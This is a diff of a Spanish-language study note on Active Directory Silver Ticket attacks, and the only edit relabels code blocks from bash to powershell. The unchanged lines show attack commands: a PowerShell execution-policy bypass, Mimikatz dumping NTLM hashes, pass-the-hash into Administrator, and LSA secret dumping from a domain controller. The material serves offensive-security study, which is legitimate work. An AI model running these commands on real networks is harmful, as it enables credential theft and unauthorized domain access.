@@ -4,7 +4,7 @@ Tags: #AD #Window #Powershell
 
 Envuelve la creación de un TGS valido para un servicio especifico donde el hash de la contraseña es obtenido. Esto permite un acceso no autorizado al servicio forjando por TGS modificado. Los 'Silver Tickets' tienen un alcance mas pequeño comparado a los 'Golden Tickets', como solo proveer acceso a un recurso especifico en el sistema host y recurso. Los atacantes pueden forjar un 'Silver Ticket' para crear y usar TGS sin interactuar con los KDC.
 
-```bash 
+```powershell 
 ❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
  	# ep = Ejecutar politicas 
  	
@@ -24,7 +24,7 @@ Envuelve la creación de un TGS valido para un servicio especifico donde el hash
 		❯ Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords"' # Nos muestra el hash NTLM de todos los usuarios asi como el del 'Admin'
 ```
 
-```bash 
+```powershell
 # Abrimos una nueva consola de Poweshell como 'Admin'
 ❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
  	# ep = Ejecutar politicas 
@@ -34,7 +34,7 @@ Envuelve la creación de un TGS valido para un servicio especifico donde el hash
 # Hacemos el 'Pass-The-Hash' e ingresamos como el usuario 'Administrator'
 ```
 
-```bash 
+```powershell 
 # El comando anteriro despliega una nueva venta en Powershell como 'Admin'
 ❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
  	# ep = Ejecutar politicas 
@@ -43,7 +43,7 @@ Envuelve la creación de un TGS valido para un servicio especifico donde el hash
 ❯ Invoke-Mimikatz -Command '"lsadump::lsa /inject"' -ComputerName <DomainController> # Muestra info para el 'Silver Ticket'
 ```
 
-```bash 
+```powershell
 # En una nueva Powershell 
 ❯ powershell -ep bypass                      # Politica que nos permite ejecutar scripts en Powershell
  	# ep = Ejecutar politicas
